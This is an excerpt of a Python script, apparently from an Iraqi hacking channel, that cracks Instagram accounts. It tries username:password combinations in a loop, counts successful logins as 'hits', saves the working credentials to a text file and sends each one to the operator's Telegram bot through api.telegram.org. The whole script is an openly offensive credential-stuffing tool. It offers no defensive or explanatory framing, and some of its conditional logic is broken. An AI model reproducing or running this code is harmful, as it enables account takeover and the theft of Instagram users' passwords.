...
os.system("title " + " #OREO Was Here - @BBBBFBBB")
...
h , b,s,block = 0,0,0,0
tele = input("[+] تريد الصيد يجيك تلي🗿🔫 Y/N ?: ")
if "Y" in tele:
    id = input("[+] ايدي تلي🇮🇶 : ")
    bot = input("[+] توكن بوتك✅ : ")
elif "y" in tele:
...
if ask == "3":
    ...
    while True:
        ...
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=- جبتلك حساب انستا حبيبي 😂.\n====================\n[=] User : {user} \n[=] Pass : {pasw}\n====================\nCh : @BBBBFBBB")
...
#==================================================================
    ...
    for combo in acc:
        ...
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=-    لا تنسه دز صور صيد😂.\n====================\n[=] User : {user} \n[=] Pass : {pasw}\n====================\nCh : @BBBBFBBB")
         
            open("الصيد الصدت.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
